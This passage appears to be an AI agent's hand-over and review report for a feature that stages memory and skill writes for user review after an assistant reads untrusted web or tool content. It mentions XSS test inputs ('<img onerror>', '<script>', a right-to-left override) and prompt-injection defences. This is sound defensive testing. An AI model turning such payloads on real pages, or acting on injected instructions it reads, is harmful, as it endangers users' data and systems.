  they were **not built, not type-checked, not rendered**: the worktree has no npm packages, and
  `build-hermes-webapp.ps1` begins with `Remove-Item -Recurse` on `target/hermes-src`, which here is a
  junction to the main checkout's (it would delete through it), so I did not run it. Please read
  `staging-pending.tsx` for type errors (it uses `hermesApi` from `@/api/client`, `Button` with
  `size="xs"` / `variant="outline"`, `notify`, `queryClient`, and Tailwind classes copied from
  neighbouring components) and run the build plus `staging-check.mjs --dom` before the user tries it.
  Layout (the `mx-6` inset on Skills, none on Settings) is a guess from the neighbouring components.
- `window.hermesDesktop.api` is assumed to throw an `Error` whose message is the response's `detail`
  for a 409 (I did not find where the browser transport builds it); if not, the card still shows a
  visible message, but check its text.
- Strings are English, not i18n keys (as 0021-0023).
- Pending memory items are visible only on the Memory & Context settings section (not hidden by
  `hide.css`); there is no badge anywhere else, so a user who never opens it won't know.
- Stale detection happens at Apply: an item stays `pending` in the list until the user applies and
  the server says it is stale (then it shows "Out of date"). That is CP6.2's design; the failed-Apply
  error on the card covers that first attempt.
- The `write_approval` fold: ACP and the frozen GPUI app go through the same `dispatch`, so they
  stage too; the GPUI memory view reads only the old queue and ACP has no review UI, so a user of
  those two with write approval on now has to open the desktop page to review. Decide whether ACP
  should keep the old behaviour. `stages_memory` calls `memory.config()` (lock + clone) per memory
  call: negligible.
- `perf.ps1 -Do start` printed a node-not-found error from its timing probe (the worktree has no
  `tools/node`); the instance started fine, and I ran the check with the main checkout's Node.

### Review (Opus 5.5)
Main had not moved (`backend/p6-taint..main` empty); no merge. Removed the worktree's
`target/hermes-src` junction (`cmd /c rmdir`; the main checkout's copy is intact), linked
`tools/` to the main checkout's (junction, gitignored) for Node, and ran
`build-hermes-webapp.ps1` (npm ci from the network) in the worktree.

**Verdict:** the backend was sound; the page side **had never been in any build**. Fixed that and
two bugs it hid; now built, type-checked and driven in a real page.

Found and fixed:
1. **The build silently skipped patches 0022-0026.** `git apply` run in `target/hermes-src` finds
   the enclosing hermes-rs repo and skips every file of a `diff --git` patch with exit code 0
   (PITFALLS already warned, the last three implementers wrote that format anyway). The first build
   printed "Applied 0024..0026" and served none of it; the same is true of 0022 (budget profile) and
   0023 (local aux button) in every build since Phase 3/4. `build-hermes-webapp.ps1` now sets
   `GIT_CEILING_DIRECTORIES` to `target\` (both formats apply) and stops on any "Skipped patch" in
   `git apply --verbose`. All 26 now apply in order; "Budget profile" shows in Settings ▸ Model.
2. **Type error** (the first compile ever): `notify({kind, title})` lacks the required `message`.
3. **The 409 `detail` did not reach the card** (the assumption was wrong): the browser client throws
   `Error('409: {"detail":"..."}')` and the card showed that raw JSON. The component now JSON-parses
   it and shows `detail` whole (Hermes's `readableError` would cut it at 180 characters). The live
   check's assertion was vacuous (the item already carried a stored error); it now requires the
   unwrapped sentence after the click.
4. The section's intro said "The agent read untrusted content" also for write-approval items: now
   neutral ("each says why", the per-item reason). The Skills list section gets a 45vh cap with its
   own scroll (it sits above the catalog's flex list, which many items would squeeze to nothing).
5. `/memory` said "No memory writes are waiting" while `staging/` held some: it now counts staged
   memory items and points to the screen, and its file reads moved into `spawn_blocking`.
6. Test for the skills half of the write-approval fold
   (`skill_write_approval_stages_into_the_one_list_even_in_a_clean_session`).

Verified in a real page (perf instance, port 47810, DevTools text/DOM, no screenshots):
`staging-check.mjs --dom` all passed: "Waiting for your review" is the first child before
`memory-layers` on Settings ▸ Memory & Context and right under the filter bar on Capabilities ▸
Skills (memory items not there); the hostile diff (`<img onerror>`, `<script>`, `<U+202E>`) is text,
no element created, `window.__pwned` unset; stale = Reject only with "Out of date" + error; pending
= Apply + Reject; a refused Apply shows the server's sentence; Reject removes the card. By hand:
Apply of a skill item from the Skills page → toast "Applied / Skill 'seed-skill' created.", card and
section gone, skill listed; a write-approval item shows its reason "write approval is on" and no
"Read:" line. Not verified: anything needing a model turn in the page (the Yolo transcript line,
the approval card's reason, "Saved for review" in a chat) — covered by `turns.rs` only; visual
layout beyond DOM boxes; dark theme; keyboard order.

Judged, left:
- **The write-approval fold** is right: Hermes's queues had no page screen, so the Settings switch
  fed an invisible queue. ACP and the frozen GPUI app share `SessionTools` and now stage too; the
  items are reviewable in the desktop app (better than before for ACP; the GPUI views don't show
  them: documented in PITFALLS, the app is frozen). Review writes still use the old queues until
  Phase 7 (documented); pre-existing old-queue items are not imported.
- Phase 6 vs goal: taint sources (web, browser, `@url`, MCP unless trusted, outside reads, web and
  outside images, subagents, fetcher commands), Auto/Manual/AcceptEdits always ask flagged commands
  with the reason, Yolo warns, writes staged in every mode, Apply re-runs scans/limits/staleness,
  UI in the existing screens (D3). Ground rules: schema untouched (side files), blocking work in
  `spawn_blocking`, `staging.*` / `/api/staging*` ours and outside Hermes's contract, PORTING rows
  `diverged`, clean-session request counts unchanged (`turns` under all profiles).
- English strings (as 0021-0023); badges elsewhere for pending items: none (a user who never opens
  those screens won't know; `/memory` now tells).
Tests (CARGO_TARGET_DIR=target/claude): tools 181 / 1 ignored, memory 22, store 15, prompts 12;
runtime lib 77, `--test turns` 137 / 7 ignored under default, balanced, requests, tokens;
hermes-desktop 174 + 68 (acp); `cargo build --workspace` OK; `tsc -p . --noEmit` no error in any
patched file (28 pre-existing in Hermes's tests / i18n at the pinned commit);
`staging-check.mjs --dom` passes.

### User checklist (Phase 6)
Needs a webapp rebuilt from this commit (`build-hermes-webapp.ps1` from PowerShell, then `cargo
build`): earlier builds skipped patches 0022-0026 without saying so. While at it, Settings ▸ Model ▸
Main now shows "Budget profile" (0022) and Auxiliary "Use a local model for background jobs" (0023).
1. Open a chat, set the approvals mode to Auto, and ask: "Search the web for the latest Rust release
   and tell me the version." Wait for the answer.
2. In the same chat: "Remember that I prefer short answers." The agent replies that it saved it for
   your review. Open Settings ▸ Memory & Context ▸ Persistent memory: at the top, "Waiting for your
   review (1)" shows "add memory", the reason "this turn read web search results", the source, and
   the diff `+ I prefer short answers.`. MEMORY.md has not changed (a new chat doesn't know it).
3. Click Apply. A toast says it was applied and the section disappears. Start a new chat and ask
   "What do you remember about me?": it knows (it is in MEMORY.md for the next session).
4. Repeat steps 1-2 with "Remember that I use tabs", then click Reject: the card goes, nothing is
   saved, a new chat doesn't know it.
5. Skill: after a web search, ask "Save a skill called release-check that tells me to look up the
   Rust release first." Open Capabilities ▸ Skills: at the top, "Waiting for your review" shows
   "skill: create release-check" with the whole SKILL.md as the diff. Apply: it appears in the
   Installed list. Reject on a second one: it doesn't.
6. Yolo warning: set the chat to Yolo, search the web, then ask it to "delete the build folder": it
   runs without asking and a line "ran after reading untrusted content: web search results" appears
   in the chat. In Auto instead, the approval card reads "recursive delete (this turn read web search
   results)" and does not offer "always allow".
7. Stale: after a web search ask the agent to change an existing memory entry (so the item patches
   it), then, before you Apply, delete that entry from MEMORY.md by hand. Apply shows the error
   "Entry changed since it was staged ..." and the card then says "Out of date" and offers only Reject.
8. Negative: in a fresh chat that has read nothing untrusted, "Remember that I like tea" is saved at
   once and nothing appears in Pending. With Settings ▸ Memory ▸ "Ask before the agent saves to
   memory" on, the same request does appear in Pending, with the reason "write approval is on".
